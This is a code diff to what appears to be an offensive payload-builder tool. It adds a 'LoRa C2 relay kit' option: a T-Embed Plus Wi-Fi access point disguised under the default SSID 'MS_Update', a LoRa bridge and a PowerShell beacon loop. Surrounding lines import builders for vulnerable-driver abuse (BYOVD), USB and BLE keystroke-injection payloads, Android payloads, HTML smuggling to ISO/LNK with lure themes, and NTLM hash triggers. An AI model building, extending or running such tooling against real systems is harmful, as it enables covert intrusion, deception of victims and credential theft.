@@ -311,6 +311,7 @@ from builders.runner  import build_runner, build_runner_sc, build_runner_sc_c2
 from builders.byovd   import build_byovd, build_byovd_sc
 from builders.usbhid  import build_usb_payload, DEVICES as USB_DEVICES
 from builders.blehid   import build_ble_payload, DEVICES as BLE_DEVICES, build_android_ble_payload, ANDROID_DEVICES
+from builders.lora_c2  import build_lora_payload
 from builders.android  import build_android_payload
 from builders.smuggle    import build_smuggle_payload, LURE_PRESETS as SMUGGLE_LURES, load_inject_js
 from builders.ntlm_trigger import build_ntlm_triggers
@@ -701,6 +702,22 @@ def cmd_build(args, cfg, ws):
         build_android_payload(
             lhost, port, lport, android_out,
             mode = android_mode,
+        )
+        did_something = True
+
+    # ── LoRa C2 relay (T-Embed Plus) ─────────────────────────────────────────
+    if getattr(args, "lora", False):
+        lora_out    = getattr(args, "lora_out",    None) or ws.path("lora")
+        lora_ssid   = getattr(args, "lora_ssid",   "MS_Update")
+        lora_pass   = getattr(args, "lora_pass",   "Upd@te2024!")
+        lora_freq   = getattr(args, "lora_freq",   915.0)
+        lora_serial = getattr(args, "lora_serial", "/dev/ttyUSB0")
+        build_lora_payload(
+            lora_out,
+            ssid        = lora_ssid,
+            password    = lora_pass,
+            freq_mhz    = lora_freq,
+            serial_port = lora_serial,
         )
         did_something = True
 
@@ -1493,7 +1510,7 @@ def main():
                          help="Generate USB HID keystroke payloads for a built stager (tool name)")
     build_p.add_argument("--usb-device",    metavar="TYPE",  dest="usb_device", default="all",
                          choices=list(USB_DEVICES) + ["all"],
-                         help="HID device type: duck | pico | digispark | all  (default: all)")
+                         help="HID device type: duck | pico | digispark | teembed | all  (default: all)")
     build_p.add_argument("--usb-out",       metavar="DIR",   dest="usb_out",    default=None,
                          help="Output directory for payload files (default: <workspace>/usb/)")
     build_p.add_argument("--usb-boot-delay", metavar="MS",   dest="usb_boot_delay", type=int, default=2000,
@@ -1523,6 +1540,18 @@ def main():
                          help="Output directory for Android BLE payload (default: <workspace>/ble_android/)")
     build_p.add_argument("--android-out",        metavar="DIR",   dest="android_out",        default=None,
                          help="Output directory for Android server-side files (default: <workspace>/android/)")
+    build_p.add_argument("--lora",         action="store_true", dest="lora",
+                         help="Generate LoRa C2 relay kit: T-Embed Plus WiFi AP + LoRa bridge + PS1 beacon loop")
+    build_p.add_argument("--lora-ssid",    metavar="SSID",  dest="lora_ssid",   default="MS_Update",
+                         help="WiFi AP SSID broadcast by T-Embed relay (default: MS_Update)")
+    build_p.add_argument("--lora-pass",    metavar="PASS",  dest="lora_pass",   default="Upd@te2024!",
+                         help="WPA2 password for T-Embed AP (default: Upd@te2024!)")
+    build_p.add_argument("--lora-freq",    metavar="MHZ",   dest="lora_freq",   type=float, default=915.0,
+                         help="LoRa frequency in MHz: 915.0 (BR/US) | 868.0 (EU)  (default: 915.0)")
+    build_p.add_argument("--lora-serial",  metavar="PORT",  dest="lora_serial", default="/dev/ttyUSB0",
+                         help="Operator receiver serial port for lora_listener.py (default: /dev/ttyUSB0)")
+    build_p.add_argument("--lora-out",     metavar="DIR",   dest="lora_out",    default=None,
+                         help="Output directory for LoRa C2 kit (default: <workspace>/lora/)")
     build_p.add_argument("--smuggle",        metavar="TOOL",  dest="smuggle", nargs="?", const="__c2_agent__",
                          help="HTML smuggling → ISO → LNK (tool name, or bare --smuggle for C2 agent stager)")
     build_p.add_argument("--smuggle-lure",   metavar="THEME", dest="smuggle_lure", default="update",
